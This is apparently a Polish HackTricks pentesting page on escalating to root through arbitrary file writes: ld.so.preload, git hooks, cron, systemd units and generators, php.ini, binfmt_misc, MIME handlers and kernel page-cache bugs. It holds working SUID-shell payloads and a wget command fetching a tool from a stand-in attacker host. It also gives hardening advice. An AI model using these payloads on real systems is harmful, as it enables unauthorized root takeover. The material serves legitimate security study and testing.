# Zapis dowolnego pliku jako root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` to systemowa lista obiektów współdzielonych, które dynamiczny linker ładuje przed innymi obiektami współdzielonymi. Tryb bezpiecznego wykonywania nakłada dodatkowe ograniczenia na wstępne ładowanie, dlatego ścieżka do biblioteki, taka jak `/tmp/pe.so`, nie jest uniwersalną techniką dla plików binarnych SUID.\
Jeśli możesz utworzyć ten plik lub go zmodyfikować, proces, który go wczyta, załaduje wymienioną bibliotekę przed innymi obiektami współdzielonymi, umożliwiając wykonanie kodu w kontekście tego procesu.<sup>[[12]](#references)</sup>

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unlink("/etc/ld.so.preload");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

### OCR output jako ograniczony zapis do pliku

Usługa OCR, która pozwala wywołującemu wybrać zapisywaną nazwę pliku, może zamienić rozpoznany tekst obrazu w prymityw **ograniczonego zapisu do pliku**. Zapisywane bajty to rozpoznany tekst, a nie bajty obrazu, więc sprawdź wynik OCR pod kątem błędów składni. Jeśli dozwolone miejsce docelowe jest wykonywalne przez web i pozwala na nazwę pliku `.php`, tekst może zostać wykonany po jego zażądaniu. W MakeSense lokalnie dostępna aplikacja OCR zapisywała tekst w `/saved/`; jej serwer PHP uruchomiony jako root wykonywał następnie zapisany plik jako root. Zapis był ograniczony do tego katalogu — nie wykazano przechodzenia do innych ścieżek.<sup>[[37]](#references)</sup>

Uprawnienia uzyskane podczas wykonania są uprawnieniami **procesu obsługującego PHP**, a nie automatycznie uprawnieniami procesu zapisującego OCR. Potwierdź mapowanie miejsca docelowego na wykonywany kod i tożsamość procesu w czasie działania; proces OCR zapisujący jako root w połączeniu z nieuprzywilejowanym serwerem web nie spowodowałby uruchomienia PHP jako root.<sup>[[37]](#references)</sup> Porównaj bezpośredni [wzorzec przesyłania plików do katalogu głównego witryny](../../pentesting-web/file-upload/).

### Git hooks

**Git hooks** to wykonywalne skrypty uruchamiane w odpowiedzi na zdarzenia w repozytorium, w tym operacje commit i merge. Jeśli **uprzywilejowany skrypt lub użytkownik** wykonuje te operacje, a atakujący może **zapisywać w folderze `.git`**, hook może posłużyć do **eskalacji uprawnień**.<sup>[[13]](#references)</sup>

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był uruchamiany za każdym razem, gdy tworzony jest nowy commit:

```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```

### Privileged Git tree export path traversal

Uprzywilejowany synchronizator może pominąć checkout, a zamiast tego wyliczyć zawartość repozytorium kontrolowanego przez atakującego za pomocą `git ls-tree`, odczytać każdy blob poleceniem `git cat-file`, połączyć podaną ścieżkę z katalogiem stagingowym i samodzielnie zapisać plik. Staje się to **arbitrary file write z uprawnieniami synchronizatora**, gdy synchronizator używa `-c safe.directory=*` (wyłączając zabezpieczenie Git przed repozytoriami należącymi do innego użytkownika) i nie sprawdza, czy ścieżka docelowa mieści się w katalogu. Bezwzględna nazwa wpisu w drzewie powoduje, że `os.path.join(stage, name)` w Pythonie odrzuca `stage`; ścieżka względna zawierająca `../` prowadzi poza katalog, gdy system plików ją rozwiąże. Ponieważ aplikacja materializuje surowe drzewo, zamiast zlecić jego checkout Gitowi, odrzucanie ścieżek podczas checkoutu nie chroni miejsca zapisu.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Szukaj takiego wzorca kodu w usługach działających z uprawnieniami roota, timerach, agentach wdrożeniowych, importerach szablonów oraz zadaniach backupu i przywracania:<sup>[[30]](#references)</sup>

```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
    target = os.path.join(stage_root, git_path)  # no containment check
    os.makedirs(os.path.dirname(target), exist_ok=True)
    with open(target, "wb") as output:
        output.write(git("cat-file", "blob", oid))
```

Wpis drzewa jest zakodowany jako `<mode> SP <name> NUL <raw object ID>`. Opcja `git hash-object --literally` celowo dopuszcza dane obiektu, które mogą zostać odrzucone podczas zwykłego parsowania lub przez `git fsck`, więc w jednorazowym klonie można utworzyć drzewo, którego nazwa pliku jest bezwzględną ścieżką docelową. W tym przykładzie tworzony jest obiekt blob pliku cron, opakowywany w commit, a następnie gałąź jest na niego przesuwana; wykorzystanie podatności nadal wymaga uprawnień do aktualizacji repozytorium używanego przez zadanie z podwyższonymi uprawnieniami oraz serwera Git, który akceptuje nieprawidłowy obiekt.<sup>[[30]](#references)[[31]](#references)</sup>

```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```

Utwardzanie musi obejmować zarówno przyjmowanie repozytoriów, jak i końcową operację na systemie plików:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zastąp `safe.directory=*` dokładnymi repozytoriami, którym usługa musi ufać, i w miarę możliwości przetwarzaj repozytoria bez uprawnień root.
- Przed materializacją odrzucaj nazwy bezwzględne oraz każdy komponent `.` lub `..`. Po połączeniu ścieżek kanonizuj wynik i sprawdzaj, czy miejsce docelowe nadal znajduje się w obrębie zamierzonego katalogu głównego.
- Unikaj wyścigów symlinków typu „sprawdź, a potem otwórz”: otwieraj ścieżki względem zaufanego deskryptora katalogu, a w systemie Linux używaj `openat2()` z `RESOLVE_BENEATH` oraz `RESOLVE_NO_SYMLINKS` dla ścieżek kontrolowanych przez atakującego.
- Zamiast ponownie implementować checkout na podstawie wyjścia z plumbing, preferuj zwykły checkout w odizolowanym katalogu. Jeśli wymagane jest przyjmowanie surowych obiektów, włącz walidację po stronie odbioru, taką jak `receive.fsckObjects=true`; nie obniżaj poziomu błędów `receive.fsck.*` związanych ze ścieżkami, które są potrzebne do odrzucania spreparowanych drzew.

### Wdrażanie uprzywilejowanej konfiguracji

Niektóre usługi zarządzające przechowują zamierzony stan systemu w pliku konfiguracyjnym, a następnie wdrażają go z podwyższonymi uprawnieniami. Na przykład [openmediavault przechowuje konfigurację w `/etc/openmediavault/config.xml`](https://docs.openmediavault.org/en/7.x/faq.html), a jego [interfejs RPC](https://docs.openmediavault.org/en/8.x/development/tools/omv_rpc.html) może stosować zmiany usług. Jeśli konto z niższymi uprawnieniami może zapisywać lub podmieniać ten plik, sprawdź, czy może też zażądać autoryzowanego wdrożenia i czy wybrany moduł wykorzystuje zmienione pole jako root. Klucze kont SSH, zaplanowane polecenia i instalowanie pakietów mają różne wymagania wstępne; sama obecność pliku lub możliwość zapisu do pliku XML nie dowodzi, że którakolwiek z tych możliwości istnieje. Sprawdź uprawnienia do pliku i katalogu nadrzędnego, grupy użytkownika i jego autoryzację RPC, zainstalowaną wersję oraz faktyczny komponent przetwarzający — nie edytuj konfiguracji ani nie wywołuj operacji stosowania zmian podczas inwentaryzacji.

Definicje akcji Fail2Ban w `/etc/fail2ban/action.d/` stanowią kolejną granicę uprzywilejowanej konfiguracji. Użytkownik, który może zapisywać w tym katalogu i przeszukiwać go, może być w stanie podmienić definicję akcji lub dodać jej nadpisanie, ale same uprawnienia do katalogu nie dowodzą możliwości wykonania kodu. Potwierdź, że włączony jail faktycznie wybiera zmienioną akcję, że usługa Fail2Ban wykonuje ją z wyższymi uprawnieniami oraz że nastąpi autoryzowane przeładowanie lub ponowne uruchomienie, po którym wystąpi pasujące zdarzenie blokady. Niezwiązane z tym uprawnienie sudo do ponownego uruchomienia Fail2Ban ma znaczenie tylko wtedy, gdy dotyczy dokładnego wywołania usługi, a zmieniona definicja zostanie wczytana. [Konfiguracja akcji Fail2Ban](https://github.com/fail2ban/fail2ban/blob/master/man/jail.conf.5) opisuje relację między katalogiem akcji a jailami; jej [przykładowa akcja](https://github.com/fail2ban/fail2ban/blob/master/config/action.d/iptables.conf) pokazuje, że `actionban` jest uruchamiane po blokadzie z uprawnieniami użytkownika usługi. Sprawdzaj uprawnienia i efektywną konfigurację bez modyfikowania akcji ani wywoływania blokad podczas inwentaryzacji.

Osobna granica występuje, gdy włączony jail Fail2Ban używa akcji e-mail wzbogacanej danymi WHOIS. [CVE-2021-32749](https://github.com/fail2ban/fail2ban/security/advisories/GHSA-m985-3f3v-cwmm) dotyczyło niezaufanego tekstu WHOIS przekazywanego potokiem do GNU mailutils `mail`, którego obsługa sekwencji ucieczki mogła uruchomić polecenie. Użytkownik z niższymi uprawnieniami, który może zapisywać pliki, może wpływać na odpowiedź, jeśli może zmienić konfigurację nadpisania serwera używanego przez **wybranego klienta WHOIS**; [plik `whois.conf(5)` w Debianie](https://manpages.debian.org/bookworm/whois/whois.conf.5.en.html) opisuje jeden z takich plików, ale jego ścieżka i użycie zależą od instalacji. Sprawdź efektywną konfigurację jaila i akcji, tożsamość usługi, faktycznego klienta WHOIS i ścieżkę jego konfiguracji, implementację mail, możliwość kontrolowania odpowiedzi oraz poprawkę dostawcy lub backport dla zainstalowanej wersji. Sam zapisywalny plik konfiguracji WHOIS, wersja Fail2Ban lub akcja e-mail nie dowodzą istnienia całego łańcucha; podczas pasywnej inwentaryzacji nie odpytuj zewnętrznego serwera ani nie wywołuj blokad.

### Tworzenie plików przez TFTP i uprzywilejowane hooki pakietów

Dostępna usługa TFTP może przekraczać granicę kontenera lub użytkownika lokalnego, gdy jej **efektywne** ustawienia tftpd-hpa powodują, że działa jako root, udostępnia katalog główny systemu plików jako katalog `--secure` i włączają `--create`. [Podręcznik tftpd-hpa](https://manpages.debian.org/trixie/tftpd-hpa/tftpd.8.en.html) opisuje opcje tworzenia plików i użytkownika. Umożliwia to potencjalne utworzenie nowego pliku w uprzywilejowanym katalogu konfiguracyjnym, w tym `/etc/apt/apt.conf.d/`; istniejący plik może jednak nadal być chroniony przed podmianą. [Podręcznik konfiguracji APT](https://manpages.debian.org/bookworm/apt/apt.conf.5.en.html) opisuje polecenia `APT::Update::Pre-Invoke`. Proces `apt update` uruchomiony jako root może stać się procesem wykorzystującym wyższe uprawnienia **tylko wtedy**, gdy odczyta nowy plik konfiguracyjny. Potwierdź rzeczywiste argumenty i tożsamość działającego demona, osiągalność sieciową i filtrowanie, zasady tworzenia plików w katalogu docelowym, efektywny zakres konfiguracji APT oraz późniejsze wywołanie z podwyższonymi uprawnieniami. Sam plik domyślny, zapisywalny katalog docelowy lub zaplanowane polecenie APT nie dowodzą istnienia całej ścieżki. W ramach pasywnej wstępnej analizy odczytuj wyłącznie lokalną konfigurację i metadane z ograniczonym zakresem, bez przesyłania pliku ani uruchamiania APT.

### Pliki Cron i czasu

Jeśli możesz **zapisywać pliki związane z cron, które są wykonywane przez root**, zazwyczaj możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Ciekawe cele obejmują:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab roota w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` i uruchamiane przez nie usługi

Szybkie kontrole:

```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```

Typowe ścieżki nadużyć:

- **Dopisz nowe zadanie cron uruchamiane jako root** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąp skrypt** już uruchamiany przez `run-parts`
- **Dodaj backdoor do istniejącego celu timera**, modyfikując uruchamiany przez niego skrypt lub plik binarny

Minimalny przykład payloadu cron:

```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```

Jeśli możesz zapisywać wyłącznie w katalogu cron używanym przez `run-parts`, umieść tam plik wykonywalny:

```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```

Uwagi:

- `run-parts` zwykle ignoruje nazwy plików zawierające kropki, dlatego lepiej używać nazw takich jak `backup` zamiast `backup.sh`.<sup>[[15]](#references)</sup>
- Niektóre systemy używają timerów `systemd` zamiast klasycznego crona, ale sposób nadużycia jest taki sam: **zmodyfikuj to, co root uruchomi później**.<sup>[[20]](#references)</sup>

### Pliki usług i gniazd

Jeśli możesz zapisywać **pliki jednostek `systemd`** lub pliki, do których się odwołują, możesz uzyskać wykonanie kodu jako root przez przeładowanie i ponowne uruchomienie jednostki albo oczekiwanie na uruchomienie ścieżki aktywacji usługi/gniazda.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Sprawdź też uprawnienia do zapisu i przeszukiwania samego katalogu jednostek systemowych, w tym ACL: użytkownik może utworzyć nową jednostkę w `/etc/systemd/system`, nawet gdy odczyt lub wyświetlanie zawartości katalogu jest zablokowane. Sama ta ścieżka niczego nie uruchamia. Upewnij się, że menedżer systemu wczyta nową jednostkę, wywołujący ma efektywne uprawnienia `systemctl start` lub `restart` dla jej nazwy, pozwalające działać jako root (albo istnieje inna uprzywilejowana ścieżka aktywacji), oraz że usługa działa z zamierzoną tożsamością. Zmiana istniejącej, wczytanej jednostki na dysku może wymagać `daemon-reload`; wczytywanie nowej jednostki o innej nazwie działa inaczej. Przed uznaniem reguły ponownego uruchamiania z symbolem wieloznacznym za wystarczającą sprawdź dokładne argumenty i wykluczenia w sudo. Zobacz [ścieżkę wyszukiwania jednostek systemd](https://www.freedesktop.org/software/systemd/man/latest/systemd.unit.html) oraz [semantykę wczytywania i przeładowywania w systemctl](https://www.freedesktop.org/software/systemd/man/latest/systemctl.html).

Ciekawe cele:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania typu drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria usług wskazane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=` wczytywane przez usługę działającą jako root

Szybkie sprawdzenia:

```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```

Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w jednostce usługi należącej do roota, którą możesz modyfikować
- **Dodanie drop-in override** z podstępnym `ExecStart=` i wcześniejsze wyczyszczenie starej wartości
- **Umieszczenie backdoora w skrypcie/pliku binarnym** już wskazanym w jednostce
- **Przejęcie usługi aktywowanej przez socket** przez modyfikację odpowiadającego jej pliku `.service`, który jest uruchamiany po odebraniu połączenia przez socket

Przykładowy złośliwy override:

```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```

Typowy przebieg aktywacji:

```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```

Jeśli nie możesz samodzielnie ponownie uruchomić usług, ale możesz edytować jednostkę aktywowaną przez socket, wystarczy **poczekać na połączenie klienta**, aby uruchomić usługę z backdoorem jako root.<sup>[[17]](#references)</sup>

### Katalogi generatorów systemd

**Generatory systemowe** to pliki wykonywalne uruchamiane przez menedżera systemu przed wczytaniem plików jednostek, zarówno podczas rozruchu, jak i ponownego wczytywania konfiguracji. Dlatego dostęp do zapisu w katalogu generatorów systemowych (lub do istniejącego generatora wykonywalnego) daje bezpośrednią możliwość wykonania kodu jako root, którą łatwo przeoczyć podczas audytu sprawdzającego tylko pliki `*.service` i `*.timer`.<sup>[[35]](#references)[[36]](#references)</sup>

Typowa kolejność wyszukiwania to `/run/systemd/system-generators/`, `/etc/systemd/system-generators/`, `/usr/local/lib/systemd/system-generators/` i `/usr/lib/systemd/system-generators/` (niektóre dystrybucje udostępniają `/lib/systemd/system-generators/` przez połączenie katalogów `/usr`). Plik wykonywalny o tej samej nazwie w katalogu znajdującym się wcześniej na liście przesłania późniejszy plik. Nie myl tych **katalogów wejściowych plików wykonywalnych** z `/run/systemd/generator`, `/run/systemd/generator.early` i `/run/systemd/generator.late`, które zawierają tymczasowe jednostki generowane przez generatory.<sup>[[35]](#references)</sup>

Szybkie kontrole:

```bash
for d in /run/systemd/system-generators /etc/systemd/system-generators \
         /usr/local/lib/systemd/system-generators /usr/lib/systemd/system-generators \
         /lib/systemd/system-generators; do
    [ -e "$d" ] || continue
    namei -l "$d"
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
    getfacl -p "$d" "$d"/* 2>/dev/null
done
```

Nowo utworzony generator musi mieć ustawiony bit wykonywalności. Jeśli prymityw zapisu pozwala kontrolować bajty, ale nie tryb, wybierz istniejący generator z ustawionym bitem wykonywalności; nadpisanie go w miejscu zwykle zachowuje jego metadane. Jeśli katalog jest zapisywalny, utwórz nowy wpis i ustaw go jako wykonywalny.<sup>[[35]](#references)</sup>

```bash
cat > /etc/systemd/system-generators/zz-update <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown 0:0 /tmp/rootbash
chmod 4755 /tmp/rootbash
rm -f "$0"
EOF
chmod 755 /etc/systemd/system-generators/zz-update
```

Wywołanie `systemctl daemon-reload` dla menedżera **systemowego** wymaga odpowiednich uprawnień, ale ponownie uruchamia wszystkie generatory systemowe; w przeciwnym razie poczekaj na przeładowanie z uprawnieniami, operację pakietową lub ponowne uruchomienie systemu. Katalogi generatorów użytkownika, takie jak `~/.config/systemd/user-generators/`, są uruchamiane przez menedżera użytkownika i same w sobie **nie zapewniają uprawnień roota**.<sup>[[35]](#references)</sup>

Na potrzeby hardeningu i wyszukiwania zagrożeń sprawdzaj każdy element ścieżki i ACL, a nie tylko końcowe bity uprawnień; zapisuj bazowe hashe i właścicieli pakietów generatorów oraz twórz alerty o utworzeniu, zmianie nazwy, zawartości lub uprawnień we wszystkich systemowych katalogach wejściowych generatorów. Monitorowanie zapisu jest ważne, ponieważ generator uruchamiany jednorazowo może usunąć się po wykonaniu, a wygenerowane drzewo jednostek w `/run/systemd/generator*` jest odtwarzane przy następnym przeładowaniu.<sup>[[35]](#references)[[36]](#references)</sup>

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe demony weryfikują kod PHP dostarczony przez użytkownika, uruchamiając `php` z **restrykcyjnym plikiem `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **jakąkolwiek możliwość zapisu** (na przykład przez `file_put_contents`), a Ty możesz dotrzeć do **dokładnej ścieżki `php.ini`** używanej przez demona, możesz **nadpisać tę konfigurację**, znieść ograniczenia, a następnie przesłać drugi payload, który zostanie uruchomiony z podwyższonymi uprawnieniami.<sup>[[2]](#references)</sup>

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod, gdy niebezpieczne funkcje są już ponownie włączone.

Minimalny przykład (zastąp ścieżkę używaną przez demona):

```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```

Jeśli daemon działa jako root (lub weryfikuje ścieżki należące do roota), drugie wykonanie zapewnia kontekst roota. To w istocie **eskalacja uprawnień przez nadpisanie konfiguracji**, gdy sandboxowane środowisko uruchomieniowe nadal może zapisywać pliki.

### binfmt_misc

`binfmt_misc` udostępnia rejestracje w `/proc/sys/fs/binfmt_misc`; każda rejestracja wiąże wzorzec typu pliku z interpreterem. Wpływ na uprawnienia zależy od tego, kto może zmienić rejestrację i który proces później wykonuje pasujący plik, więc przed uznaniem tego za ścieżkę eskalacji uprawnień sprawdź, czy te warunki są spełnione.<sup>[[21]](#references)</sup>

Plik pomocniczy z prawem wykonywania i `CAP_DAC_OVERRIDE` może stanowić odrębną ścieżkę rejestracji, jeśli przyjmuje dane kontrolowane przez wywołującego i zapisuje je do `/proc/sys/fs/binfmt_misc/register`, nawet gdy wywołujący nie może bezpośrednio zapisywać do tego węzła. Podczas inwentaryzacji sprawdź dane wejściowe pliku pomocniczego i sposób zapisu, ale go nie uruchamiaj. Jeśli zarejestrowana reguła używa flagi `C`, interpreter otrzymuje poświadczenia oparte na dopasowanym pliku binarnym; dopasowanie SUID należące do roota może więc uruchomić interpreter kontrolowany przez wywołującego jako root. Potwierdź montowanie `binfmt_misc` i zasady rejestracji, efektywne capability pliku pomocniczego, dokładną regułę i ścieżkę interpretera, docelowy plik SUID z prawem wykonywania oraz to, czy `no_new_privs` lub montowanie `nosuid` blokuje zmianę SUID. Sama flaga capability lub ciąg znaków ze ścieżką osadzony w pliku to jedynie wskazówka do dalszej analizy.<sup>[[21]](#references)</sup> Informacje o warunkach blokujących SUID znajdziesz w [execve(2)](https://man7.org/linux/man-pages/man2/execve.2.html).

### Nadpisywanie obsługi schematów (takich jak http: lub https:)

Środowiska graficzne używają skojarzeń MIME i wpisów desktopowych do wyboru aplikacji obsługującej schematy URI; atakujący, który może zapisywać w odpowiednich katalogach konfiguracji użytkownika i wpisów desktopowych, może przekierować te schematy do kontrolowanego przez siebie programu uruchamiającego. Zmieniając plik `$HOME/.config/mimeapps.list`, aby wskazywał złośliwy plik jako obsługujący adresy URL HTTP i HTTPS (na przykład `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), można sprawić, że kliknięcie użytkownika wywoła ten wpis desktopowy.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```

### Root uruchamiający skrypty/pliki binarne, które użytkownik może modyfikować

Jeśli uprzywilejowany proces uruchamia coś w rodzaju `/bin/sh /home/username/.../script` (lub dowolny plik binarny znajdujący się w katalogu należącym do nieuprzywilejowanego użytkownika), możesz to przejąć:<sup>[[1]](#references)</sup>

- **Wykryj uruchomienie:** monitoruj procesy za pomocą pspy, aby wychwycić wywołania ścieżek kontrolowanych przez użytkownika przez root:<sup>[[25]](#references)</sup>

```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```

- **Potwierdź możliwość zapisu:** upewnij się, że plik docelowy i jego katalog są własnością Twojego użytkownika i możesz w nich zapisywać.
- **Przejmij plik docelowy:** wykonaj kopię zapasową oryginalnego pliku binarnego/skryptu i umieść payload, który tworzy powłokę SUID (lub wykonuje inne działanie jako root), a następnie przywróć uprawnienia:

```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```

- **Uruchom uprzywilejowaną akcję** (np. naciśnij przycisk w UI, który uruchamia helpera). Gdy root ponownie uruchomi przejętą ścieżkę, przechwyć shell z podniesionymi uprawnieniami za pomocą `./rootshell -p`.

### Modyfikacja pliku tylko w page cache uprzywilejowanych plików binarnych

Niektóre błędy jądra nie modyfikują pliku **na dysku**. Zamiast tego pozwalają modyfikować wyłącznie **kopię w page cache** czytelnego pliku. Jeśli celem jest plik binarny **setuid** lub inny plik wykonywany przez **root**, przy następnym uruchomieniu mogą zostać wykonane kontrolowane przez atakującego bajty z pamięci, co pozwoli eskalować uprawnienia, mimo że hash pliku na dysku pozostaje bez zmian.<sup>[[3]](#references)[[4]](#references)</sup>

Warto myśleć o tym jak o **prymitywie zapisu do pliku wyłącznie w czasie działania**:<sup>[[3]](#references)</sup>

- **Dysk pozostaje czysty**: inode i bajty zapisane na dysku nie ulegają zmianie
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub wykonujące zawartość z buforowanej strony otrzymują treść zmienioną przez atakującego
- **Efekt jest tymczasowy**: zmiana znika po ponownym uruchomieniu systemu lub usunięciu strony z cache

Ten prymityw znajduje się pomiędzy klasycznym **arbitrary file write** a starszymi błędami wykorzystującymi **page cache**, takimi jak Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW wykorzystywał race condition
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- prymityw działający wyłącznie w page cache może być bardziej niezawodny, jeśli podatna ścieżka umożliwia bezpośredni zapis do stron pliku buforowanych w pamięci

#### Ogólny przebieg privesc

1. Uzyskaj prymityw jądra pozwalający zapisywać do stron **page cache powiązanych z plikiem**
2. Wykorzystaj go przeciwko **czytelnemu, uprzywilejowanemu plikowi binarnemu** lub innemu plikowi wykonywanemu przez root
3. Uruchom plik, zanim strona zostanie usunięta z cache
4. Uzyskaj wykonanie kodu jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- pliki binarne **setuid-root**
- helpery uruchamiane przez **usługi root**
- pliki binarne często uruchamiane z **kontenerów współdzielących jądro/page cache hosta**

#### Przykładowa ścieżka AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) to dobry przykład tej klasy błędów. Podatna ścieżka znajdowała się w linuksowym userspace API kryptografii (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` może przenieść referencje do stron page cache z czytelnego pliku do scatterlisty TX kryptografii
- ścieżka deszyfrowania `algif_aead` w trybie in-place ponownie wykorzystywała bufory źródłowe i docelowe
- następnie `authencesn` zapisywał w obszarze tagu docelowego
- gdy ten obszar nadal wskazywał na strony pliku przeniesione przez `splice()`, zapis trafiał do **page cache pliku docelowego**

Ciekawą techniką nie jest więc samo CVE, lecz następujący schemat:

- **przekaż strony page cache powiązane z plikiem do podsystemu jądra**
- spraw, by podsystem **potraktował je jako bufor wyjściowy do zapisu**
- wywołaj niewielkie, kontrolowane nadpisanie w pamięci

Publiczny PoC używał powtarzanych zapisów **4-bajtowych**, by zmodyfikować `/usr/bin/su` w pamięci, a następnie go uruchomić.<sup>[[4]](#references)[[7]](#references)</sup>

#### Przykładowa ścieżka ESP / XFRM + klon netfilter TEE

DirtyClone (CVE-2026-43503) przedstawia inny wariant tego samego schematu **zapisu do roota wyłącznie w page cache**, tym razem wykorzystujący jako element docelowy **deszyfrowanie IPsec ESP**, a nie `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Kluczową techniką jest **modyfikacja metadanych**:

- `splice()` umieszcza **stronę page cache pliku tylko do odczytu** w pakiecie ESP-in-UDP
- pierwotna mitigacja DirtyFrag oznaczała ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` **najpierw kopiował dane, a dopiero potem je deszyfrował**
- netfilter `TEE` duplikuje pakiet za pośrednictwem `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zachowuje **referencję do tej samej fizycznej strony page cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` uznaje wtedy klon za bezpieczny i wykonuje deszyfrowanie **in-place `cbc(aes)`** na stronie powiązanej z plikiem

Wniosek dla osób analizujących kod jest szerszy niż samo CVE: jeśli mitigacja polega na **metadanych skb/strony**, aby ustalić, czy najpierw należy skopiować dane, dowolna ścieżka **klonowania/kopiowania, która zachowuje stronę bazową, ale gubi metadane**, może po cichu ponownie otworzyć możliwość zapisu.

Typowy przebieg exploita:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, aby uzyskać **`CAP_NET_ADMIN` w prywatnej przestrzeni nazw sieci**
2. uruchom loopback i zainstaluj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. zainstaluj transportowe SA XFRM ESP za pośrednictwem `NETLINK_XFRM`
4. zakoduj każde docelowe 4-bajtowe słowo w polu SA `seq_hi` (sztuczka wyboru słowa z DirtyFrag)
5. wyślij pakiet ESP-in-UDP przeniesiony przez `splice()`, aby **klon TEE** dotarł do `esp_input()` i został odszyfrowany **in-place**
6. powtarzaj, aż kopia `/usr/bin/su` lub innego uprzywilejowanego pliku wykonywalnego w page cache będzie zawierać kod kontrolowany przez atakującego

Pod względem działania wpływ jest taki sam jak w przykładzie z `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` korzysta ze **zmodyfikowanych bajtów page cache** i zapewnia uprawnienia root.<sup>[[8]](#references)[[9]](#references)</sup>

Przydatne kontrole ekspozycji na ten wariant:

```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```

